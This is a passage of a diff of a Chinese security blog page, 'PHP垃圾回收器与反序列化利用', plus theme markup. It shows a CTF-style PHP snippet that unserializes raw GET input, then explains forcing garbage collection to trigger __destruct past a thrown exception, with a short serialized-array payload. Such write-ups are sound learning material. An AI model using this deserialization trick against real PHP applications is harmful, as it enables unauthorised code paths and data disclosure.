class="string">&quot;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;successful\n&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;中途退出啦&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
 
 <p>我们假如要执行__destruct方法，打印flag，就得绕过这个<code>throw new Exception</code>。因为<code>__destruct</code>方法是在该对象被回收时调用，而<code>exception</code>会中断该进程对该对象的销毁。所以我们需要强制让php的GC（垃圾回收机制）去进行该对象的回收。</p>
 <p>核心思想：反序列化一个数组，然后再利用第一个索引，来触发GC</p>
 <p>EXP</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;AndyNoel&quot;</span>;<br>    &#125;<br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> B, <span class="hljs-keyword">new</span> B));<br><br><span class="hljs-comment">//a:2:&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:1;O:1:&quot;B&quot;:0:&#123;&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;AndyNoel&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="keyword">new</span> B, <span class="keyword">new</span> B));</span><br><span class="line"></span><br><span class="line"><span class="comment">//a:2:&#123;i:0;O:1:&quot;B&quot;:0:&#123;&#125;i:1;O:1:&quot;B&quot;:0:&#123;&#125;&#125;</span></span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>造成该漏洞的主要原因是ArrayObject缺少垃圾回收函数。该漏洞称为“双递减漏洞”</p>
 </blockquote>
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
+        </div>
 
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
         
-  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
-  
-  
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> PHP垃圾回收器与反序列化利用</li>
+        <li><strong>作者:</strong> Sl0th</li>
+        <li><strong>创建于
+                :</strong> 2022-10-20 23:29:13</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2023-12-07 22:40:42
+            </li>
+        
+        <li>
+            <strong>链接:</strong> http://sl0th.top/2022/10/20/PHP垃圾回收器与反序列化利用/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
 
-      </span>
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/web/">#web</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/php/">#php</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/gc/">#gc</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Tabby安装配置及使用</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2022/10/01/RMI%E5%AD%A6%E4%B9%A0/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">RMI学习</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
     
-  
-</span>
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">目录</div>
+        <div class="page-title">PHP垃圾回收器与反序列化利用</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="nav-text">PHP垃圾回收器与反序列化利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6"><span class="nav-text">垃圾回收机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP5-3%E4%B9%8B%E5%89%8D"><span class="nav-text">PHP5.3之前</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP5-3"><span class="nav-text">PHP5.3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP7%E7%9A%84NTS%E7%89%88%E6%9C%AC"><span class="nav-text">PHP7的NTS版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E6%94%B6%E5%91%A8%E6%9C%9F"><span class="nav-text">回收周期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9E%83%E5%9C%BE%E7%9A%84%E4%BA%A7%E7%94%9F"><span class="nav-text">垃圾的产生</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9B%9E%E6%94%B6%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="nav-text">回收的过程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">反序列化中的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#destruct%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">__destruct魔术方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A7%E7%89%88%E6%9C%ACGC"><span class="nav-text">旧版本GC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E7%89%88%E6%9C%ACGC-zval%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-text">新版本GC-zval结构体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A6%E5%8F%91%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6"><span class="nav-text">触发垃圾回收</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ArrayObject"><span class="nav-text">ArrayObject</span></a></li></ol></li></ol></li></ol>
 
     </div>
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/web/">#web</a>
-      
-        <a href="/tags/php/">#php</a>
-      
-        <a href="/tags/gc/">#gc</a>
-      
-    </div>
-  
+</div>
+        </div>
+    
 </div>
 
 
-              
-  
 
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>PHP垃圾回收器与反序列化利用</div>
-      <div>http://sloth31.github.io/2022/10/20/PHP垃圾回收器与反序列化利用/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>Sl0th</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年10月20日</div>
-        </div>
-      
-      
-      <div class="license-meta-item">
-        <div>许可协议</div>
-        <div>
-          
-            
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
-              <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                <i class="iconfont icon-by"></i>
-              </span>
-              </a>
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
-              <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
-                <i class="iconfont icon-nc"></i>
-              </span>
-              </a>
-            
-              <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
-              <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
-                <i class="iconfont icon-sa"></i>
-              </span>
-              </a>
-            
-          
-        </div>
-      </div>
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
+                
 
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2022/12/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7Tabby%E4%BD%BF%E7%94%A8/" title="Tabby安装配置及使用">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Tabby安装配置及使用</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2022/10/01/RMI%E5%AD%A6%E4%B9%A0/" title="RMI学习">
-                        <span class="hidden-mobile">RMI学习</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
             </div>
 
             
-          </article>
+
         </div>
-      </div>
-    </div>
 
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Sl0th</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 44 篇文章
+                    </span>
+                    
+                </p>
+            
         </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.3</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
     </div>
-  </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
 </div>
 
+        </div>
     
 
-    
-  </main>
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
 
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
     </div>
-  
-  
-    <div class="statistics">
-  
-  
 
-  
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
+    <div class="image-viewer-container">
+    <img src="">
 </div>
 
-  
-  
-  
-</div>
 
-  </footer>
+    
 
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
-    })
-  </script>
+</main>
 
 
-<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+    
+<script src="/js/libs/Swup.min.js"></script>
 
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
 
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
 
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
 
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
 
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
 
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
 <script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      collapseDepth   : CONFIG.toc.collapseDepth || 0,
-      scrollSmooth    : true,
-      headingsOffset  : -boardTop
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
     });
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
-    }
-  });
 </script>
 
 
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
-    }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
-
-  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
 
 
   
+<script src="/js/libs/Typed.min.js"></script>
 
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
 </body>
 </html>
